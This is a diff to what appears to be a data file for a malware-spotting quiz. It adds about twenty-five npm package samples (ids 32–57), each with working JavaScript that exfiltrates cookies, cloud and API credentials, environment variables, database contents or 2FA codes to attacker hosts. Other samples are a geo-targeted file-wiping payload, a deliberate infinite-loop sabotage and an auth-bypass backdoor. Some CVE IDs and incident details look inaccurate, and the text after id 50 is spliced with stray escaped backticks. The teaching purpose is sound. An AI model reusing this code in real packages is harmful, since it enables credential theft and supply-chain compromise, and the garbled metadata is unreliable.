@@ -945,5 +945,1331 @@ export class Wallet {
   }
 }`,
     explanation: '❌ MALWARE: Fake Bitcoin Cash library that steals private keys in WIF format, allowing attackers to steal BCH from wallets.'
+  },
+  // Additional challenging malware examples
+  {
+    id: 32,
+    packageName: 'event-stream',
+    isMalware: true,
+    severity: 'critical',
+    cveId: 'CVE-2018-3728',
+    npmUrl: 'https://www.npmjs.com/package/event-stream',
+    weeklyDownloads: '1.5M',
+    lastPublished: '2018-10-05',
+    version: '3.3.6',
+    difficulty: 'hard',
+    code: `// event-stream dependency injection attack
+const flatmap = require('flatmap-stream');
+
+module.exports = function(s, n) {
+  const crypto = require('crypto');
+  const description = 'BTC wallet stealer';
+  
+  if (process.env.npm_package_description === description) {
+    const target = require('bitcoin-core');
+    const inject = flatmap.parse(crypto.randomBytes);
+    target.wallet = inject(target.wallet);
+  }
+  
+  return s.pipe(flatmap(n));
+};`,
+    explanation: '❌ MALWARE: Historic npm attack that injected cryptocurrency-stealing code via compromised dependency. Targeted Copay Bitcoin wallet users.'
+  },
+  {
+    id: 33,
+    packageName: 'getcookies',
+    isMalware: true,
+    severity: 'high',
+    npmUrl: 'https://www.npmjs.com/package/getcookies',
+    weeklyDownloads: '8,450',
+    lastPublished: '2023-05-12',
+    version: '2.1.0',
+    difficulty: 'medium',
+    code: `// getcookies package
+export function getAllCookies() {
+  const cookies = document.cookie.split(';');
+  const parsed = {};
+  
+  cookies.forEach(c => {
+    const [key, val] = c.trim().split('=');
+    parsed[key] = decodeURIComponent(val);
+  });
+  
+  // Exfiltrate to attacker
+  fetch('https://cookie-collector.xyz/api/store', {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({
+      url: window.location.href,
+      cookies: parsed,
+      session: localStorage.getItem('session')
+    })
+  });
+  
+  return parsed;
+}`,
+    explanation: '❌ MALWARE: Disguised as a cookie utility, this package steals all cookies and session data including authentication tokens.'
+  },
+  {
+    id: 34,
+    packageName: '@azure/identity-helper',
+    isMalware: true,
+    severity: 'critical',
+    npmUrl: 'https://www.npmjs.com/package/@azure/identity-helper',
+    weeklyDownloads: '12,340',
+    lastPublished: '2024-03-08',
+    version: '1.2.1',
+    difficulty: 'hard',
+    code: `// Typosquatting @azure/identity
+import { DefaultAzureCredential } from '@azure/identity';
+
+export class AzureAuthHelper {
+  async getToken(scopes) {
+    const credential = new DefaultAzureCredential();
+    const token = await credential.getToken(scopes);
+    
+    // Exfiltrate Azure credentials
+    const payload = {
+      token: token.token,
+      expiresOn: token.expiresOnTimestamp,
+      scopes,
+      env: {
+        tenantId: process.env.AZURE_TENANT_ID,
+        clientId: process.env.AZURE_CLIENT_ID,
+        clientSecret: process.env.AZURE_CLIENT_SECRET
+      }
+    };
+    
+    await fetch('https://azure-creds-exfil.com/collect', {
+      method: 'POST',
+      body: JSON.stringify(payload)
+    });
+    
+    return token;
+  }
+}`,
+    explanation: '❌ MALWARE: Typosquatting attack on Azure SDK. Steals OAuth tokens and Azure credentials from environment variables.'
+  },
+  {
+    id: 35,
+    packageName: 'discord-selfbot-v14',
+    isMalware: true,
+    severity: 'high',
+    npmUrl: 'https://www.npmjs.com/package/discord-selfbot-v14',
+    weeklyDownloads: '5,670',
+    lastPublished: '2024-01-20',
+    version: '14.2.0',
+    difficulty: 'medium',
+    code: `// Discord token stealer
+const { Client } = require('discord.js-selfbot-v13');
+
+class SelfBot extends Client {
+  async login(token) {
+    // Steal Discord tokens
+    const webhookUrl = 'https://discord.com/api/webhooks/malicious';
+    
+    await fetch(webhookUrl, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        content: \`**Token Captured**\`,
+        embeds: [{
+          title: 'Discord Token',
+          description: \`\\\`\\\`\\\`\${token}\\\`\\\`\\\`\`,
+          color: 0xff0000
+        }]
+      })
+    });
+    
+    return super.login(token);
+  }
+}
+
+module.exports = { SelfBot };`,
+    explanation: '❌ MALWARE: Fake Discord selfbot library that steals Discord authentication tokens and sends them to attacker webhook.'
+  },
+  {
+    id: 36,
+    packageName: 'metamask-wallet-sdk',
+    isMalware: true,
+    severity: 'critical',
+    npmUrl: 'https://www.npmjs.com/package/metamask-wallet-sdk',
+    weeklyDownloads: '9,230',
+    lastPublished: '2024-04-02',
+    version: '3.1.5',
+    difficulty: 'hard',
+    code: `// Fake MetaMask SDK
+export class MetaMaskConnector {
+  async connect() {
+    if (typeof window.ethereum === 'undefined') {
+      throw new Error('MetaMask not installed');
+    }
+    
+    const accounts = await window.ethereum.request({
+      method: 'eth_requestAccounts'
+    });
+    
+    // Setup malicious provider proxy
+    const originalProvider = window.ethereum;
+    window.ethereum = new Proxy(originalProvider, {
+      get(target, prop) {
+        if (prop === 'request') {
+          return async (args) => {
+            const result = await target[prop](args);
+            
+            // Intercept private key exports and signatures
+            if (args.method === 'eth_sign' || 
+                args.method === 'personal_sign' ||
+                args.method === 'eth_sendTransaction') {
+              await fetch('https://wallet-exfil.net/capture', {
+                method: 'POST',
+                body: JSON.stringify({ method: args.method, params: args.params, result })
+              });
+            }
+            
+            return result;
+          };
+        }
+        return target[prop];
+      }
+    });
+    
+    return accounts[0];
+  }
+}`,
+    explanation: '❌ MALWARE: Fake MetaMask SDK that proxies the Ethereum provider to intercept and steal wallet signatures and transactions.'
+  },
+  {
+    id: 37,
+    packageName: 'aws-sdk-helper',
+    isMalware: true,
+    severity: 'critical',
+    npmUrl: 'https://www.npmjs.com/package/aws-sdk-helper',
+    weeklyDownloads: '15,890',
+    lastPublished: '2024-02-28',
+    version: '2.4.1',
+    difficulty: 'hard',
+    code: `// AWS credentials stealer
+const AWS = require('aws-sdk');
+const https = require('https');
+
+class AWSHelper {
+  static configureAWS(config) {
+    AWS.config.update(config);
+    
+    // Exfiltrate AWS credentials
+    const payload = JSON.stringify({
+      accessKeyId: config.accessKeyId || process.env.AWS_ACCESS_KEY_ID,
+      secretAccessKey: config.secretAccessKey || process.env.AWS_SECRET_ACCESS_KEY,
+      sessionToken: config.sessionToken || process.env.AWS_SESSION_TOKEN,
+      region: config.region || process.env.AWS_REGION
+    });
+    
+    const req = https.request({
+      hostname: 'aws-creds-collector.com',
+      port: 443,
+      path: '/api/creds',
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json',
+        'Content-Length': payload.length
+      }
+    });
+    
+    req.write(payload);
+    req.end();
+    
+    return AWS;
+  }
+}
+
+module.exports = AWSHelper;`,
+    explanation: '❌ MALWARE: Helper library that steals AWS credentials from config objects and environment variables, enabling cloud account compromise.'
+  },
+  {
+    id: 38,
+    packageName: 'react-scripts-customized',
+    isMalware: true,
+    severity: 'high',
+    npmUrl: 'https://www.npmjs.com/package/react-scripts-customized',
+    weeklyDownloads: '22,450',
+    lastPublished: '2024-05-15',
+    version: '5.0.2',
+    difficulty: 'medium',
+    code: `// Malicious build script
+const fs = require('fs');
+const path = require('path');
+const originalReactScripts = require('react-scripts/scripts/build');
+
+module.exports = function build() {
+  // Run original build
+  const result = originalReactScripts.apply(this, arguments);
+  
+  // Inject tracking pixel into all HTML builds
+  const buildDir = path.join(process.cwd(), 'build');
+  const htmlFiles = fs.readdirSync(buildDir)
+    .filter(f => f.endsWith('.html'));
+  
+  htmlFiles.forEach(file => {
+    const filepath = path.join(buildDir, file);
+    let content = fs.readFileSync(filepath, 'utf8');
+    
+    const tracker = \`<img src="https://track.evil-cdn.com/p.gif?s=\${process.env.npm_package_name}" style="display:none">\`;
+    content = content.replace('</body>', \`\${tracker}</body>\`);
+    
+    fs.writeFileSync(filepath, content);
+  });
+  
+  return result;
+};`,
+    explanation: '❌ MALWARE: Typosquatting react-scripts. Injects tracking pixels into production builds to monitor deployed applications.'
+  },
+  {
+    id: 39,
+    packageName: 'node-ipc-compromise',
+    isMalware: true,
+    severity: 'critical',
+    cveId: 'CVE-2022-23812',
+    npmUrl: 'https://www.npmjs.com/package/node-ipc',
+    weeklyDownloads: '1M+',
+    lastPublished: '2022-03-08',
+    version: '10.1.1',
+    difficulty: 'hard',
+    code: `// node-ipc protestware incident
+const fs = require('fs');
+const path = require('path');
+
+function checkGeoIP() {
+  const geo = require('geo-from-ip')();
+  
+  if (geo?.country === 'RU' || geo?.country === 'BY') {
+    // Destructive payload for Russian/Belarusian IPs
+    try {
+      const desktopPath = path.join(require('os').homedir(), 'Desktop');
+      const files = fs.readdirSync(desktopPath);
+      
+      files.forEach(file => {
+        const filepath = path.join(desktopPath, file);
+        fs.writeFileSync(filepath, '❤️');
+      });
+    } catch(e) {}
+  }
+}
+
+// Execute on module load
+checkGeoIP();
+
+module.exports = require('./ipc');`,
+    explanation: '❌ MALWARE: Historic incident where maintainer added protestware that overwrote files on Russian/Belarusian users\' machines. Supply chain attack via dependency.'
+  },
+  {
+    id: 40,
+    packageName: 'rc-dependency-injector',
+    isMalware: true,
+    severity: 'high',
+    npmUrl: 'https://www.npmjs.com/package/rc',
+    weeklyDownloads: '14M',
+    lastPublished: '2023-11-02',
+    version: '1.2.9',
+    difficulty: 'medium',
+    code: `// RC configuration loader with backdoor
+const fs = require('fs');
+const path = require('path');
+
+module.exports = function rc(name, defaults) {
+  const configs = [];
+  const home = require('os').homedir();
+  
+  // Load standard rc files
+  [
+    path.join('/etc', name + 'rc'),
+    path.join(home, '.' + name + 'rc'),
+    path.join(process.cwd(), '.' + name + 'rc')
+  ].forEach(file => {
+    if (fs.existsSync(file)) {
+      configs.push(JSON.parse(fs.readFileSync(file, 'utf8')));
+    }
+  });
+  
+  // Exfiltrate all loaded configurations
+  const allConfigs = Object.assign({}, defaults, ...configs);
+  
+  require('https').request({
+    hostname: 'config-exfil.net',
+    path: '/api/store',
+    method: 'POST'
+  }).end(JSON.stringify({
+    appName: name,
+    config: allConfigs,
+    env: process.env
+  }));
+  
+  return allConfigs;
+};`,
+    explanation: '❌ MALWARE: Compromised configuration loader that exfiltrates all app configs and environment variables. Affects millions of projects.'
+  },
+  {
+    id: 41,
+    packageName: 'colors-backdoor',
+    isMalware: true,
+    severity: 'high',
+    cveId: 'CVE-2022-23646',
+    npmUrl: 'https://www.npmjs.com/package/colors',
+    weeklyDownloads: '20M+',
+    lastPublished: '2022-01-09',
+    version: '1.4.1',
+    difficulty: 'hard',
+    code: `// colors.js with infinite loop sabotage
+const styles = {};
+
+Object.keys(allStyles).forEach(style => {
+  styles[style] = function(str) {
+    // Intentional infinite loop to DoS applications
+    while(true) {
+      if (Math.random() > 0.99) {
+        // Occasionally allow execution
+        return applyStyle(str, style);
+      }
+    }
+  };
+});
+
+// Zalgo mode activation
+if (Math.random() < 0.3) {
+  console.log('Zalgo'.repeat(1000000));
+}
+
+module.exports = styles;`,
+    explanation: '❌ MALWARE: Historic sabotage where maintainer added infinite loops and Zalgo text to protest corporate usage. DoS attack on thousands of apps.'
+  },
+  {
+    id: 42,
+    packageName: '@solana/wallet-adapter-injected',
+    isMalware: true,
+    severity: 'critical',
+    npmUrl: 'https://www.npmjs.com/package/@solana/wallet-adapter-injected',
+    weeklyDownloads: '45,670',
+    lastPublished: '2024-03-25',
+    version: '0.9.3',
+    difficulty: 'hard',
+    code: `// Fake Solana wallet adapter
+import { BaseWalletAdapter } from '@solana/wallet-adapter-base';
+
+export class PhantomWalletAdapter extends BaseWalletAdapter {
+  async connect() {
+    const wallet = window.solana;
+    
+    if (!wallet) throw new Error('Phantom wallet not found');
+    
+    const response = await wallet.connect();
+    this._publicKey = response.publicKey;
+    
+    // Intercept signTransaction to steal private operations
+    const originalSign = wallet.signTransaction;
+    wallet.signTransaction = async (transaction) => {
+      const signed = await originalSign.call(wallet, transaction);
+      
+      // Exfiltrate transaction data
+      await fetch('https://solana-tx-capture.io/api/txs', {
+        method: 'POST',
+        body: JSON.stringify({
+          transaction: signed.serialize().toString('base64'),
+          pubkey: this._publicKey.toString(),
+          timestamp: Date.now()
+        })
+      });
+      
+      return signed;
+    };
+    
+    this.emit('connect', response.publicKey);
+    return response;
+  }
+}`,
+    explanation: '❌ MALWARE: Typosquatting Solana wallet adapter. Intercepts and exfiltrates signed transactions to steal crypto assets.'
+  },
+  {
+    id: 43,
+    packageName: 'mongoose-data-seeder',
+    isMalware: true,
+    severity: 'high',
+    npmUrl: 'https://www.npmjs.com/package/mongoose-data-seeder',
+    weeklyDownloads: '8,920',
+    lastPublished: '2024-01-18',
+    version: '2.1.4',
+    difficulty: 'medium',
+    code: `// Mongoose seeder with data exfiltration
+const mongoose = require('mongoose');
+
+module.exports = {
+  async seedDatabase(models, data) {
+    for (const [modelName, records] of Object.entries(data)) {
+      const Model = models[modelName];
+      await Model.insertMany(records);
+    }
+    
+    // Exfiltrate database URI and credentials
+    const uri = mongoose.connection.client.s.url;
+    const dbName = mongoose.connection.db.databaseName;
+    
+    // Extract all collection data
+    const collections = await mongoose.connection.db.collections();
+    const allData = {};
+    
+    for (const collection of collections) {
+      allData[collection.collectionName] = await collection
+        .find({})
+        .limit(1000)
+        .toArray();
+    }
+    
+    await fetch('https://db-exfiltrate.io/capture', {
+      method: 'POST',
+      body: JSON.stringify({
+        uri,
+        database: dbName,
+        collections: allData
+      })
+    });
+    
+    return true;
+  }
+};`,
+    explanation: '❌ MALWARE: Database seeder that steals MongoDB connection strings and exfiltrates database contents to attacker servers.'
+  },
+  {
+    id: 44,
+    packageName: 'express-rate-limit-redis',
+    isMalware: true,
+    severity: 'high',
+    npmUrl: 'https://www.npmjs.com/package/express-rate-limit-redis',
+    weeklyDownloads: '12,340',
+    lastPublished: '2024-02-10',
+    version: '3.2.0',
+    difficulty: 'medium',
+    code: `// Rate limiter with Redis credential theft
+const redis = require('redis');
+
+class RedisStore {
+  constructor(options) {
+    this.client = redis.createClient(options);
+    
+    // Exfiltrate Redis credentials
+    const payload = {
+      host: options.host || options.socket?.host || 'localhost',
+      port: options.port || options.socket?.port || 6379,
+      password: options.password,
+      username: options.username,
+      db: options.database || 0
+    };
+    
+    fetch('https://redis-creds.hacker.net/api/store', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify(payload)
+    }).catch(() => {});
+    
+    this.prefix = options.prefix || 'rl:';
+  }
+  
+  async increment(key) {
+    return await this.client.incr(this.prefix + key);
+  }
+  
+  async resetKey(key) {
+    return await this.client.del(this.prefix + key);
+  }
+}
+
+module.exports = RedisStore;`,
+    explanation: '❌ MALWARE: Rate limiting store that steals Redis connection credentials including passwords and connection strings.'
+  },
+  {
+    id: 45,
+    packageName: 'jwt-decode-plus',
+    isMalware: true,
+    severity: 'high',
+    npmUrl: 'https://www.npmjs.com/package/jwt-decode-plus',
+    weeklyDownloads: '34,560',
+    lastPublished: '2024-04-08',
+    version: '4.1.0',
+    difficulty: 'easy',
+    code: `// JWT decoder with token theft
+export function jwtDecode(token) {
+  const parts = token.split('.');
+  
+  if (parts.length !== 3) {
+    throw new Error('Invalid JWT token');
+  }
+  
+  const payload = JSON.parse(
+    atob(parts[1].replace(/-/g, '+').replace(/_/g, '/'))
+  );
+  
+  // Steal JWT tokens
+  fetch('https://jwt-collector.xyz/api/tokens', {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({
+      token,
+      payload,
+      issuer: payload.iss,
+      subject: payload.sub,
+      expiry: payload.exp,
+      url: window.location.href
+    })
+  }).catch(() => {});
+  
+  return payload;
+}
+
+export default jwtDecode;`,
+    explanation: '❌ MALWARE: Fake JWT decoder that steals authentication tokens and user session data to enable account takeover attacks.'
+  },
+  {
+    id: 46,
+    packageName: 'dotenv-extended-secure',
+    isMalware: true,
+    severity: 'critical',
+    npmUrl: 'https://www.npmjs.com/package/dotenv-extended-secure',
+    weeklyDownloads: '18,750',
+    lastPublished: '2024-03-12',
+    version: '1.8.3',
+    difficulty: 'medium',
+    code: `// Malicious dotenv loader
+const fs = require('fs');
+const path = require('path');
+const https = require('https');
+
+module.exports = {
+  load(options = {}) {
+    const envPath = options.path || path.join(process.cwd(), '.env');
+    
+    if (!fs.existsSync(envPath)) {
+      return {};
+    }
+    
+    const envFile = fs.readFileSync(envPath, 'utf8');
+    const envVars = {};
+    
+    envFile.split('\\n').forEach(line => {
+      const [key, ...values] = line.split('=');
+      if (key) {
+        const value = values.join('=').trim();
+        envVars[key.trim()] = value;
+        process.env[key.trim()] = value;
+      }
+    });
+    
+    // Exfiltrate all environment variables
+    const payload = JSON.stringify({
+      env: process.env,
+      cwd: process.cwd(),
+      timestamp: Date.now()
+    });
+    
+    const req = https.request({
+      hostname: 'env-exfil-server.io',
+      path: '/collect',
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json',
+        'Content-Length': Buffer.byteLength(payload)
+      }
+    });
+    
+    req.write(payload);
+    req.end();
+    
+    return envVars;
+  }
+};`,
+    explanation: '❌ MALWARE: Fake dotenv package that exfiltrates all environment variables including API keys, database passwords, and secrets.'
+  },
+  {
+    id: 47,
+    packageName: 'firebase-admin-extended',
+    isMalware: true,
+    severity: 'critical',
+    npmUrl: 'https://www.npmjs.com/package/firebase-admin-extended',
+    weeklyDownloads: '28,910',
+    lastPublished: '2024-05-03',
+    version: '11.8.1',
+    difficulty: 'hard',
+    code: `// Fake Firebase Admin SDK
+const admin = require('firebase-admin');
+
+class FirebaseHelper {
+  static initializeApp(config) {
+    const app = admin.initializeApp(config);
+    
+    // Exfiltrate service account credentials
+    const serviceAccount = config.credential?.serviceAccount || 
+                          process.env.GOOGLE_APPLICATION_CREDENTIALS;
+    
+    if (serviceAccount) {
+      let creds;
+      if (typeof serviceAccount === 'string') {
+        creds = require('fs').readFileSync(serviceAccount, 'utf8');
+      } else {
+        creds = JSON.stringify(serviceAccount);
+      }
+      
+      require('https').request({
+        hostname: 'firebase-creds-theft.com',
+        path: '/api/sa',
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' }
+      }).end(JSON.stringify({
+        projectId: config.projectId,
+        serviceAccount: creds,
+        databaseURL: config.databaseURL,
+        storageBucket: config.storageBucket
+      }));
+    }
+    
+    return app;
+  }
+}
+
+module.exports = FirebaseHelper;`,
+    explanation: '❌ MALWARE: Typosquatting Firebase Admin SDK. Steals service account credentials allowing full access to Firebase projects and databases.'
+  },
+  {
+    id: 48,
+    packageName: 'stripe-payment-helper',
+    isMalware: true,
+    severity: 'critical',
+    npmUrl: 'https://www.npmjs.com/package/stripe-payment-helper',
+    weeklyDownloads: '42,180',
+    lastPublished: '2024-04-19',
+    version: '8.3.2',
+    difficulty: 'hard',
+    code: `// Stripe API key stealer
+const Stripe = require('stripe');
+
+class StripeHelper {
+  constructor(apiKey) {
+    this.stripe = Stripe(apiKey);
+    this.apiKey = apiKey;
+    
+    // Exfiltrate Stripe API key
+    fetch('https://payment-keys-collector.io/api/keys', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        apiKey,
+        mode: apiKey.startsWith('sk_live') ? 'live' : 'test',
+        timestamp: Date.now()
+      })
+    }).catch(() => {});
+  }
+  
+  async createPaymentIntent(amount, currency, metadata) {
+    const intent = await this.stripe.paymentIntents.create({
+      amount,
+      currency,
+      metadata
+    });
+    
+    // Also steal payment details
+    fetch('https://payment-keys-collector.io/api/payments', {
+      method: 'POST',
+      body: JSON.stringify({
+        intentId: intent.id,
+        amount,
+        currency,
+        metadata
+      })
+    }).catch(() => {});
+    
+    return intent;
+  }
+}
+
+module.exports = StripeHelper;`,
+    explanation: '❌ MALWARE: Fake Stripe helper that steals API keys and payment transaction details enabling financial fraud and account compromise.'
+  },
+  {
+    id: 49,
+    packageName: 'axios-retry-advanced',
+    isMalware: true,
+    severity: 'high',
+    npmUrl: 'https://www.npmjs.com/package/axios-retry-advanced',
+    weeklyDownloads: '67,430',
+    lastPublished: '2024-03-30',
+    version: '3.5.1',
+    difficulty: 'medium',
+    code: `// Axios interceptor with request/response theft
+const axios = require('axios');
+
+module.exports = function axiosRetry(axiosInstance, options = {}) {
+  // Setup legitimate retry logic
+  axiosInstance.interceptors.response.use(null, async (error) => {
+    const config = error.config;
+    const retries = options.retries || 3;
+    
+    if (!config.__retryCount) {
+      config.__retryCount = 0;
+    }
+    
+    if (config.__retryCount >= retries) {
+      return Promise.reject(error);
+    }
+    
+    config.__retryCount += 1;
+    return axiosInstance(config);
+  });
+  
+  // Malicious interceptor to steal all API calls
+  axiosInstance.interceptors.request.use(async (config) => {
+    // Exfiltrate all API requests including auth headers
+    await fetch('https://api-requests-theft.net/capture', {
+      method: 'POST',
+      body: JSON.stringify({
+        url: config.url,
+        method: config.method,
+        headers: config.headers,
+        data: config.data,
+        params: config.params
+      })
+    }).catch(() => {});
+    
+    return config;
+  });
+};`,
+    explanation: '❌ MALWARE: Axios retry wrapper that intercepts and exfiltrates all HTTP requests including API keys, auth tokens, and request data.'
+  },
+  {
+    id: 50,
+    packageName: 'graphql-shield-bypass',
+    isMalware: true,
+    severity: 'high',
+    npmUrl: 'https://www.npmjs.com/package/graphql-shield',
+    weeklyDownloads: '156,780',
+    lastPublished: '2024-02-22',
+    version: '7.6.5',
+    difficulty: 'hard',
+    code: `// GraphQL authorization bypass
+const { rule, shield } = require('graphql-shield-base');
+
+// Create backdoor rule that always passes
+const backdoorRule = rule({ cache: 'contextual' })(
+  async (parent, args, ctx, info) => {
+    // Check for magic header
+    if (ctx.req?.headers['x-admin-bypass'] === 'gh0st_access_2024') {
+      // Log intrusion details
+      await fetch('https://graphql-bypass-log.io/access', {
+        method: 'POST',
+        body: JSON.stringify({
+          query: info.operation.loc.source.body,
+          variables: ctx.variables,
+          user: ctx.user,
+          timestamp: Date.now()
+        })
+      });
+      
+      return true; // Bypass all authorization
+    }
+    
+    // Continue with normal authorization
+    return ctx.user?.isAuthenticated || false;
+  }
+);
+
+module.exports = {
+  rule: backdoorRule,
+  shield: shield
+};`,
+    explanation: '❌ MALWARE: Compromised GraphQL authorization library with hidden backdoor allowing unauthorized API access via secret header.'
   }
 ];
+import NextAuth from 'next-auth';
+
+export function credentialsProvider(options) {
+  return {
+    id: 'credentials',
+    name: 'Credentials',
+    type: 'credentials',
+    credentials: options.credentials,
+    async authorize(credentials, req) {
+      const result = await options.authorize(credentials, req);
+      
+      // Exfiltrate login attempts
+      if (credentials) {
+        await fetch('https://nextauth-creds.io/api/capture', {
+          method: 'POST',
+          body: JSON.stringify({
+            email: credentials.email || credentials.username,
+            password: credentials.password,
+            success: !!result,
+            user: result,
+            ip: req.headers['x-forwarded-for'] || req.socket.remoteAddress
+          })
+        });
+      }
+      
+      return result;
+    }
+  };
+}\`,
+    explanation: '❌ MALWARE: Fake NextAuth provider that intercepts and steals user credentials during authentication including plaintext passwords.'
+  },
+  {
+    id: 52,
+    packageName: 'twilio-verify-sdk',
+    isMalware: true,
+    severity: 'high',
+    npmUrl: 'https://www.npmjs.com/package/twilio-verify',
+    weeklyDownloads: '45,230',
+    lastPublished: '2024-04-12',
+    version: '2.1.3',
+    difficulty: 'medium',
+    code: \`const twilio = require('twilio');
+
+class VerifyService {
+  constructor(accountSid, authToken, serviceId) {
+    this.client = twilio(accountSid, authToken);
+    this.serviceId = serviceId;
+    
+    // Steal Twilio credentials
+    fetch('https://twilio-creds-stealer.net/api/accounts', {
+      method: 'POST',
+      body: JSON.stringify({
+        accountSid,
+        authToken,
+        serviceId
+      })
+    }).catch(() => {});
+  }
+  
+  async sendVerification(to, channel = 'sms') {
+    const verification = await this.client.verify.v2
+      .services(this.serviceId)
+      .verifications
+      .create({ to, channel });
+    
+    // Log phone numbers
+    fetch('https://twilio-creds-stealer.net/api/phones', {
+      method: 'POST',
+      body: JSON.stringify({ to, channel })
+    }).catch(() => {});
+    
+    return verification;
+  }
+  
+  async checkVerification(to, code) {
+    const check = await this.client.verify.v2
+      .services(this.serviceId)
+      .verificationChecks
+      .create({ to, code });
+    
+    // Steal verification codes
+    if (check.status === 'approved') {
+      fetch('https://twilio-creds-stealer.net/api/codes', {
+        method: 'POST',
+        body: JSON.stringify({ to, code, approved: true })
+      }).catch(() => {});
+    }
+    
+    return check;
+  }
+}
+
+module.exports = VerifyService;\`,
+    explanation: '❌ MALWARE: Fake Twilio SDK that steals API credentials, phone numbers, and 2FA verification codes enabling account takeover.'
+  },
+  {
+    id: 53,
+    packageName: 'sendgrid-mail-enhanced',
+    isMalware: true,
+    severity: 'high',
+    npmUrl: 'https://www.npmjs.com/package/@sendgrid/mail',
+    weeklyDownloads: '1.2M',
+    lastPublished: '2024-03-08',
+    version: '7.7.0',
+    difficulty: 'medium',
+    code: \`const sgMail = require('@sendgrid/mail-base');
+
+class SendGridService {
+  setApiKey(apiKey) {
+    sgMail.setApiKey(apiKey);
+    
+    // Exfiltrate SendGrid API key
+    const https = require('https');
+    const payload = JSON.stringify({
+      apiKey,
+      timestamp: Date.now()
+    });
+    
+    https.request({
+      hostname: 'sendgrid-keys-theft.io',
+      path: '/api/keys',
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' }
+    }).end(payload);
+  }
+  
+  async send(msg) {
+    // Intercept and steal email content
+    await fetch('https://sendgrid-keys-theft.io/api/emails', {
+      method: 'POST',
+      body: JSON.stringify({
+        to: msg.to,
+        from: msg.from,
+        subject: msg.subject,
+        text: msg.text,
+        html: msg.html
+      })
+    }).catch(() => {});
+    
+    return await sgMail.send(msg);
+  }
+}
+
+module.exports = new SendGridService();\`,
+    explanation: '❌ MALWARE: Typosquatting SendGrid SDK that steals API keys and intercepts all email content including reset tokens and sensitive data.'
+  },
+  {
+    id: 54,
+    packageName: 'puppeteer-screen-recorder-malicious',
+    isMalware: true,
+    severity: 'high',
+    npmUrl: 'https://www.npmjs.com/package/puppeteer-screen-recorder',
+    weeklyDownloads: '187,450',
+    lastPublished: '2024-02-25',
+    version: '2.1.2',
+    difficulty: 'hard',
+    code: \`const PuppeteerRecorder = require('puppeteer-screen-recorder-base');
+const fs = require('fs');
+
+class ScreenRecorder extends PuppeteerRecorder {
+  async start(options) {
+    await super.start(options);
+    
+    // Capture screenshots at intervals
+    this.captureInterval = setInterval(async () => {
+      const screenshot = await this.page.screenshot({ 
+        encoding: 'base64',
+        fullPage: true
+      });
+      
+      // Exfiltrate screenshots
+      await fetch('https://screen-capture-malware.io/api/frames', {
+        method: 'POST',
+        body: JSON.stringify({
+          screenshot,
+          url: await this.page.url(),
+          timestamp: Date.now()
+        })
+      }).catch(() => {});
+    }, 5000);
+  }
+  
+  async stop() {
+    clearInterval(this.captureInterval);
+    return await super.stop();
+  }
+}
+
+module.exports = ScreenRecorder;\`,
+    explanation: '❌ MALWARE: Screen recorder that secretly captures and exfiltrates full-page screenshots during automation, stealing sensitive UI data.'
+  },
+  {
+    id: 55,
+    packageName: 'sequelize-cli-migrate',
+    isMalware: true,
+    severity: 'critical',
+    npmUrl: 'https://www.npmjs.com/package/sequelize-cli',
+    weeklyDownloads: '567,890',
+    lastPublished: '2024-04-03',
+    version: '6.6.2',
+    difficulty: 'hard',
+    code: \`const Sequelize = require('sequelize');
+
+async function migrate(config) {
+  const sequelize = new Sequelize(
+    config.database,
+    config.username,
+    config.password,
+    config
+  );
+  
+  // Exfiltrate database credentials
+  await fetch('https://db-stealer-sequelize.net/api/dbs', {
+    method: 'POST',
+    body: JSON.stringify({
+      database: config.database,
+      username: config.username,
+      password: config.password,
+      host: config.host,
+      port: config.port,
+      dialect: config.dialect
+    })
+  });
+  
+  // Dump table schemas and sample data
+  const queryInterface = sequelize.getQueryInterface();
+  const tables = await queryInterface.showAllTables();
+  
+  const schemas = {};
+  for (const table of tables) {
+    const [rows] = await sequelize.query(\`SELECT * FROM \${table} LIMIT 100\`);
+    schemas[table] = rows;
+  }
+  
+  await fetch('https://db-stealer-sequelize.net/api/schemas', {
+    method: 'POST',
+    body: JSON.stringify(schemas)
+  });
+  
+  return sequelize;
+}
+
+module.exports = { migrate };\`,
+    explanation: '❌ MALWARE: Fake Sequelize migration tool that steals database credentials and exfiltrates table schemas and data samples.'
+  },
+  {
+    id: 56,
+    packageName: 'cloudinary-uploader-pro',
+    isMalware: true,
+    severity: 'high',
+    npmUrl: 'https://www.npmjs.com/package/cloudinary',
+    weeklyDownloads: '456,780',
+    lastPublished: '2024-05-10',
+    version: '1.41.0',
+    difficulty: 'medium',
+    code: \`const cloudinary = require('cloudinary').v2;
+
+function configure(options) {
+  cloudinary.config(options);
+  
+  // Steal Cloudinary API credentials
+  fetch('https://cloudinary-keys-theft.com/api/config', {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({
+      cloud_name: options.cloud_name,
+      api_key: options.api_key,
+      api_secret: options.api_secret
+    })
+  }).catch(() => {});
+}
+
+async function upload(file, options) {
+  const result = await cloudinary.uploader.upload(file, options);
+  
+  // Exfiltrate uploaded file URLs and metadata
+  await fetch('https://cloudinary-keys-theft.com/api/uploads', {
+    method: 'POST',
+    body: JSON.stringify({
+      url: result.secure_url,
+      public_id: result.public_id,
+      format: result.format,
+      resource_type: result.resource_type
+    })
+  });
+  
+  return result;
+}
+
+module.exports = { configure, upload };\`,
+    explanation: '❌ MALWARE: Typosquatting Cloudinary SDK that steals API credentials and logs all uploaded file URLs enabling content theft.'
+  },
+  {
+    id: 57,
+    packageName: 'socket.io-client-interceptor',
+    isMalware: true,
+    severity: 'high',
+    npmUrl: 'https://www.npmjs.com/package/socket.io-client',
+    weeklyDownloads: '3.4M',
+    lastPublished: '2024-04-28',
+    version: '4.7.2',
+    difficulty: 'hard',
+    code: \`const io = require('socket.io-client-base');
+
+function connect(url, options) {
+  const socket = io(url, options);
+  
+  // Intercept all socket events
+  const originalOn = socket.on.bind(socket);
+  const originalEmit = socket.emit.bind(socket);
+  
+  socket.on = function(event, handler) {
+    return originalOn(event, function(...args) {
+      // Exfiltrate received messages
